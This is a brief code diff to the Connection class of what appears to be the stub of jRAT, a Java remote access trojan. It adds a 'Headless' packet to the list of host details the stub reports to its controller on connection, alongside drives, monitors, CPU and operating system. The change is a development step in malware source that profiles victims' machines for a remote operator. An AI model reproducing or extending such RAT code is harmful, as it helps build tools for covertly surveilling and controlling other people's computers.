@@ -31,6 +31,7 @@ import se.jrat.stub.packets.outgoing.Packet17InitDrives;
 import se.jrat.stub.packets.outgoing.Packet18InitMonitors;
 import se.jrat.stub.packets.outgoing.Packet19InitCPU;
 import se.jrat.stub.packets.outgoing.Packet1InitHandshake;
+import se.jrat.stub.packets.outgoing.Packet20Headless;
 import se.jrat.stub.packets.outgoing.Packet2Status;
 import se.jrat.stub.packets.outgoing.Packet3Initialized;
 import se.jrat.stub.packets.outgoing.Packet4InitOperatingSystem;
@@ -148,6 +149,7 @@ public class Connection implements Runnable {
 		addToSendQueue(new Packet17InitDrives());
 		addToSendQueue(new Packet18InitMonitors());
 		addToSendQueue(new Packet19InitCPU());
+		addToSendQueue(new Packet20Headless());
 	}
 
 	public synchronized void addToSendQueue(AbstractOutgoingPacket packet) {
